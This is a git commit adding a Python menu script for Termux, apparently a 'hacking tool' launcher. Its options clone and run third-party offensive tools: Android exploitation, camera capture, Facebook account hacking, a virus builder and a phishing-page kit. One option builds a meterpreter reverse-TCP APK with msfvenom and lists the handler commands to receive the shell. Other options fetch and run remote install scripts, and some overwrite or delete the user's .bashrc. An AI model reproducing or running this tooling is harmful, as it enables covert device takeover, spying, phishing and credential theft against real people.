f4588ea5d34e5f0a0754ee725799b392fa96f14d
khalid-bx <74069890+khalid-bx@users.noreply.github.com>
2020-12-22 21:16:20 +0100

    Add files via upload

---
+++ bx.py
@@ -0,0 +1,253 @@
+import sys
+import time
+import random
+import os
+from getpass import getpass
+import base64
+#################################################################>
+os.system('clear')
+os.system('pkg install figlet -y ; pkg install lolcat -y')
+os.system('pkg install mpv -y')
+os.system('clear')
+os.system("git pull")
+###########################################################################################################################################
+co=['\033[1;30m' , '\033[1;32m' , '\033[1;33m' , '\033[1;34m' , '\033[1;35m' , '\033[1;36m' , '\033[1;37m']
+##########################################################################################################################################
+def jalan(x):
+    for e in x + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()                                                                                             
+        time.sleep(0.01)
+#################################################################>#####################################################################
+os.system('clear')
+jalan ("\033[1;31m──\033[1;36m▄▀▀▀▄\033[1;31m───────────────")
+jalan ("\033[1;31m──\033[1;36m█\033[1;31m───\033[1;36m█\033[1;31m───────────────")
+jalan ("\033[1;31m─\033[1;36m███████\033[1;31m─────────\033[1;36m▄▀▀▄\033[1;31m─")
+jalan ("\033[1;31m░\033[1;36m██─▀─██\033[1;31m░░\033[1;36m█▀█▀▀▀▀█\033[1;31m░░\033[1;36m█\033[1;31m░")
+jalan ("\033[1;31m░\033[1;36m███▄███\033[1;31m░░\033[1;36m▀\033[1;31m░\033[1;36m▀\033[1;31m░░░░░\033[1;36m▀▀\033[1;31m░░")
+#########################################################################################################################################################
+d=base64.b64decode("YngtMzA=").decode("utf-8")
+while True:
+    password=getpass('\033[1;32mEnter password :\033[1;33m ')
+    if password==d:
+        break
+    else:
+        os.system ('clear')
+        os.system ('figlet E r o r r |lolcat')
+        time.sleep(2)
+        os.system('clear')
+#######################################################################################################################
+def jalan2(z):
+    for i in z + '\n':
+        sys.stdout.write(i)
+        sys.stdout.flush()
+        time.sleep(00000.2)
+##########################################################################################################################################################
+###########################################################################################################################################################################
+os.system("mpv moro.mp3")
+os.system('clear')
+###########################################################################################################################################################################
+jalan("\033[1;36mLoading…")
+print()
+jalan("\033[1;34m█\033[1;37m▒▒▒▒▒▒▒▒▒ \033[1;31m10%")
+print()
+time.sleep(0.3)
+jalan("\033[1;34m███\033[1;37m▒▒▒▒▒▒▒ \033[1;31m30%")
+print()
+time.sleep(0.3)
+jalan("\033[1;34m█████\033[1;37m▒▒▒▒▒ \033[1;31m50%")
+print()
+time.sleep(0.3)
+jalan("\033[1;34m███████\033[1;37m▒▒▒ \033[1;31m80%")
+print()
+time.sleep(0.3)
+jalan("\033[1;34m██████████ \033[1;31m100%")
+#######################################################################################################################
+time.sleep(0.4)
+os.system('clear')
+print(random.choice(co))
+#######################################################################################################################
+jalan("──────╔═══╗╔╗───╔═══╗╔═══╗╔═╗╔═╗")
+jalan("──────║╔══╝║║───║╔═╗║║╔═╗║║║╚╝║║")
+jalan("╔╗╔╗╔╗║╚══╗║║───║║─╚╝║║─║║║╔╗╔╗║")
+jalan("║╚╝╚╝║║╔══╝║║─╔╗║║─╔╗║║─║║║║║║║║")
+jalan("╚╗╔╗╔╝║╚══╗║╚═╝║║╚═╝║║╚═╝║║║║║║║")
+jalan("─╚╝╚╝─╚═══╝╚═══╝╚═══╝╚═══╝╚╝╚╝╚╝")
+os.system('clear')
+##########################################################################################################################################################
+logo1=("""
+\033[1;33m'########::'##::::'##::             #####
+\033[1;30m ##.... ##:. ##::'##:::         ##[\033[1;31########\033[1;30m]##
+\033[1;37m ##:::: ##::. ##'##::::       ##<{\033[1;32m##########\033[1;37m}>##
+\033[1;33m ########::::. ###:::::     #<\033[1;32m Welcome to my tool\033[1;33m>#
+\033[1;30m ##.... ##::: ## ##::::     #######################
+\033[1;37m ##:::: ##:: ##:. ##:::   \033[1;33m ++++++++++++++++++++++++
+\033[1;33m ########:: ##:::. ##::   \033[1;33m ++++\033[1;31m{< K H A L I D>}\033[1;33m++++
+\033[1;30m ........:::..:::::..::   \033[1;33m ++++++++++++++++++++++++""")
+##########################################################################################################################################################
+def logo2():
+    jalan(" \033[1;30m █████████         \033[1;30m'#")
+    jalan(" \033[1;33m █▄█████▄█         \033[1;34m'#")
+    jalan(" \033[1;30m █▼▼▼▼▼            \033[1;33m'#")
+    jalan(" \033[1;33m █ \033[1;37mhak-bx v1.0     \033[1;31m'#")
+    jalan(" \033[1;30m █▲▲▲▲▲            \033[1;36m'#")
+    jalan(" \033[1;33m █████████         \033[1;34m'#")
+    jalan("\033[1;30m__██____██___       \033[1;35m'#")
+##########################################################################################################################################################################
+def awamir():
+    print(" \033[1;30m++\033[1;33m[1] \033[1;36minstall all pkg termux  \033[1;32m++ \033[1;33m[10] \033[1;36mdownload payloads     \033[1;33m++")
+    time.sleep(0.3)
+    print(" \033[1;31m++\033[1;33m[2] \033[1;36mUpdate;upgrade termux   \033[1;32m++ \033[1;33m[11] \033[1;36mTermix changed shape  \033[1;37m++")
+    time.sleep(0.3)
+    print(" \033[1;32m++\033[1;33m[3] \033[1;36mhack android            \033[1;32m++ \033[1;33m[12] \033[1;36mhack camirera         \033[1;36m++")
+    time.sleep(0.3)
+    print(" \033[1;33m++\033[1;33m[4] \033[1;36minstall metasploit      \033[1;32m++ \033[1;33m[13] \033[1;36mFactory reset         \033[1;35m++")
+    time.sleep(0.3)
+    print(" \033[1;34m++\033[1;33m[5] \033[1;36minstall ngrok           \033[1;32m++ \033[1;33m[14] \033[1;36mTools Virus4          \033[1;34m++")
+    time.sleep(0.3)
+    print(" \033[1;35m++\033[1;33m[6] \033[1;36minstall root            \033[1;32m++ \033[1;33m[15] \033[1;36mhack fb               \033[1;33m++")
+    time.sleep(0.3)
+    print(" \033[1;36m++\033[1;33m[7] \033[1;36mMy account on Facebook  \033[1;32m++ \033[1;33m[16] \033[1;36mMy account on github  \033[1;32m++")
+    time.sleep(0.3)
+    print(" \033[1;37m++\033[1;33m[8] \033[1;36mMy instagram            \033[1;32m++ \033[1;33m[17] \033[1;36mfake page             \033[1;31m++")
+    time.sleep(0.3)
+    print(" \033[1;32m++\033[1;33m[9] \033[1;36mhelp                    \033[1;32m++ \033[1;33m[0]] \033[1;36mEXIT                  \033[1;30m++")#####################################################################
+#####################################################################################################################################################################################
+print(logo1)
+logo2()
+jalan(" \033[1;30m+++++++++++++\033[1;32m+++++++++++++++\033[1;35m++++++++++++\033[1;36m++++++++++++++++++++++")
+jalan(" \033[1;32m|+++++\033[1;35m++++++++++++++\033[1;31m[whatsapp | \033[1;32m0642663312]\033[1;31m++++++++++++++++++|")
+jalan(" \033[1;36m++++++++++++++\033[1;37m++++++++++++++\033[1;34m++++++++++\033[1;33m++++++++++++\033[1;34m++++++++++++")
+awamir()
+jalan(" \033[1;30m+++++++++++\033[1;37m++++++++++++++++\033[1;33m+++++++++++++++++\033[1;34m++++++++++++++++++")
+#####################################################################################################################################################################
+chosse = input(" \033[1;31m++\033[1;34m>Chosse an option :\033[1;33m ")
+if chosse=='1':
+    jalan("plase waith...")
+    time.sleep(0.1)
+    os.system('cd ~ ; pkg update && upgrade -y ;pip install --upgrade pip ; pkg install git -y ; pkg install nano -y ; pkg install python -y ; pkg install python2 -y ; pkg install php -y;pkg install unzip -y ; pkg install openssh -y ; pkg install cat -y ; pkg install curl -y ; pkg install wget -y ; pkg install w3m -y ;pkg install golang -y ; pkg install havij -y ; pkg install db -y ; pkg install postgresql -y ; pkg install uftrace -y ; pkg install ruby -y ; pkg install perl -y; pkg install bash -y ;pkg install figlet -y;pkg install cowsay -y; pkg install tar -y;pkg install zip -y; pkg install tor -y; pkg install toilet -y;pkg install proot -y; pkg install golang -y; pkg install openssl -y;pkg install cmatrix -y ; pkg install macchanger ;pkg install root-repo -y;pkg install unstable-repo -y;pkg install x11-repo -y ; pip install --upgrade pip')
+    os.system('clear')
+    os.system('figlet d o n e !')
+    time.sleep(3)
+    os.system('clear ; python bx.py')
+###########################################################################################################################################################################
+elif chosse=='2':
+    jalan("please waith...")
+    os.system('cd ~ ; apt update && apt upgrade -y')
+    os.system('python bx.py')
+##########################################################################################################################################################
+elif chosse=='3':
+    os.system('cd ~ ; apt update && apt upgrade && git clone https://github.com/cyberknight777/PhoneSploit && cd PhoneSploit && bash termux.sh')
+###########################################################################################################################################################################
+elif chosse=='4':
+    os.system('cd ~ ; pkg install root-repo ; pkg install unstable-repo ; pkg install x11-repo ; pkg update && pkg upgrade && pkg install git curl wget nmap -y && curl -LO raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh && chmod 777 metasploit.sh && ./metasploit.sh ; bash metasploit.sh')
+##########################################################################################################################################################
+elif chosse=='5':
+    os.system('cd ~ ; apt update && apt upgrade -y && git clone https://github.com/tchelospy/termux-ngrok.git && cd termux-ngrok && chmod +x termux-ngrok.sh && ./termux-ngrok.sh')
+###########################################################################################################################################################################
+elif chosse=='6':
+    os.system('cd ~ ; apt update && apt -y upgrade && pkg install -y git && pkg install -y proot && termux-setup-storage && git clone https://github.com/Anonymous-Zp#####################################################################t/T-ro#####################################################################ot && cd T-root && bash install.sh')
+##########################################################################################################################################################
+elif chosse=='7':
+    os.system('xdg-open https://www.facebook.com/khaled.fidel.1800')
+    os.system('python bx.py')
+###########################################################################################################################################################################
+elif chosse=='8':
+    os.system('xdg-open https://www.instgram.com/brdadikhalid3')
+    os.system('python bx.py')
+######################################################################################################
+elif chosse=='9':
+    os.system('mpv help.mp3')
+    os.system('python bx.py')
+#######################################################################################################################
+elif chosse=='10':
+    os.system('clear')
+    print("\033[1;37m                O  0")
+    print("\033[1;37m                     O")
+    print("\033[1;34m|^^^^^^^^^^^^^^^^^^^^| \ ____")
+    print("\033[1;34m|     \033[1;31mPAYLOAD\033[1;34m           |_*_ \______,")
+    print("\033[1;34m|_______________________ |___| )____|")
+    print("\033[1;34m| (𖠄)  (𖠄) '**'** | (𖠄)  (𖠄) ** | (𖠄)")
+    print("\033[1;30m=======================================")
+    ip=str(input('\033[1;34mEntre ip : \033[1;33m'))
+    port=str(input('\033[1;34mEntre port : \033[1;33m'))
+    name=input('\033[1;34mEntre Name payloads : \033[1;33m ')
+    jalan('\033[1;36mplease waiht...')
+    os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=' +ip+ ' LPORT=' +port+ ' R > /sdcard/' +name+'.apk')
+    os.system('mpv paly.mp3')
+    os.system('clear')
+    jalan2('\033[1;34mplease type command 1 and 2 and 3 and 4 and 5 and 6 ')
+    time.sleep(0.4)
+    print('\033[1;36mcommand~1 > \033[1;37mmsfconsole')
+    time.sleep(0.4)
+    print('\033[1;36mcommand~2 > \033[1;37muse exploit/multi/handler')
+    time.sleep(0.4)
+    print('\033[1;36mcommand~3 > \033[1;37mset payload android/meterpreter/reverse_tcp')
+    time.sleep(0.4)
+    print('\033[1;36mcommand~4 > \033[1;37mset lhost\033[1;31m '+ip)
+    time.sleep(0.4)
+    print('\033[1;36mcommand~5 > \033[1;37mset lport\033[1;31m '+port)
+    time.sleep(0.4)
+    print('\033[1;36mcommand~6 > \033[1;31mrun') 
+######################################################################################################
+elif chosse=='11':
+    os.system('pkg install figlet -y ; pkg install cowsay ; pkg install lolcat -y')
+    os.system('cd ..')
+    a=open('.bashrc','w')
+    os.system('clear')
+    os.system('figlet K H A L I D|lolcat')
+    os.system('figlet b x|lolcat')
+    nam=input("\033[1;34mEntre your Name : ")
+    jalan2('\033[1;33mmy name is\033[1;36m '+nam)
+    time.sleep(0.3)
+    nam2=input('\033[1;34mEntre your title : ')
+    jalan2('\033[1;33mYour title is\033[1;36m '+nam2)
+    time.sleep(0.3)
+    d=('clear\ncmatrix -C red -s\ncowsay -f eyes '+nam2+'|lolcat\nfiglet '+nam+'|lolcat\nPS1="root@kali:~# "')
+    a.write(d)
+    time.sleep(0.3)
+    os.system('clear')
+    os.system('figlet D O N E !!|lolcat ')
+    time.sleep(0.3)
+    os.system('mv .bashrc $HOME')
+#################################################################>
+elif chosse=='12':
+    os.system('clear')
+    jalan('\033[1;36mpleas waith. . .')
+    os.system('pkg update ; pkg upgrade ; git clone https://github.com/vanhienfs/saycheese ; cd saycheese ; bash saycheese.sh')
+#################################################################>
+elif chosse=='13':
+    os.system('cd .. ; rm -rf .bashrc')
+    os.system('clear')
+    os.system(' figlet khalid|lolcat')
+    os.system(' figlet bx|lolcat')
+    jalan2('\033[1;36m[*] done successfully')
+    time.sleep(3)
+    os.system('python bx.py')
+#################################################################>
+elif chosse=='14':
+    os.system('clear')
+    jalan('\033[1;36mplease wath...')
+    os.system('pkg update ; pkg upgrade ; pkg install python2 -y ; git clone https://github.com/Amerlaceset/Virus4 ; cd Virus4 ; python2 Virus4.py')
+#################################################################>#################################################################>#################################################################>
+elif chosse=='15':
+    jalan('please waith...')
+    time.sleep(2)
+    os.system('cd ~ ; pkg update -y ; pkg upgrade -y ; pkg install python2 -y ; pkg install git -y ; git clone https://github.com/MoMuilWH/TmX-FW ; cd TmX-FW ; python2 TmX-FW.py')
+#################################################################>#################################################################>#############>
+elif chosse=='16':
+    os.system('xdg-open https://github.com/khalid-bx')
+    os.system('python bx.py')
+#################################################################>#################################################################>
+elif chosse=='17':
+    jalan('\033[1;36mplease waith...')
+    os.system('pkg update ; upgrade -y ; git clone https://github.com/UndeadSec/SocialFish ; cd SocialFish ; bash socialphish.sh')
+#################################################################>#################################################################>
+elif chosse=='0':
+    os.system('exit')
+    os.system('figlet happy day|lolcat')
+#################################################################>
+else:
+    jalan2('\033[1;31mplease chosse just 1 or 2 or 3 or 4 or 5 ...')
+    os.system('python bx.py')
+#################################################################>
